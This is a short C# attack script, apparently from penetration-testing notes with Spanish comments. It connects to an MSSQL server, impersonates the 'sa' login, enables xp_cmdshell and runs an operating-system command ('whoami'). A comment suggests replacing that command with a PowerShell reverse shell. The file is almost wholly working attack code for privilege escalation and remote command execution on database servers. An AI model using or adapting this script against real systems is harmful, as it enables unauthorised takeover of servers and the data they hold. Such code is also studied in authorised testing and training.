using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            
            try
            {
              con.Open();
              Console.WriteLine("Auth success!");
            }
            catch
            {
              Console.WriteLine("Auth failed");
              Environment.Exit(0);
            }
          
            // Se escriben las queries
            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
            String execCmd = "EXEC xp_cmdshell whoami";

            //Se imperosna user, cambiar al que necesitemos
            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            // Se habilita xp_cmdshell              
            command = new SqlCommand(enable_xpcmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            // Se ejecuta el comando, por defecto el whoami - cambiar por PS revshell o lo que haga falta
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Result of command is: " + reader[0]);
            reader.Close();

            con.Close();
        }
    }
}  
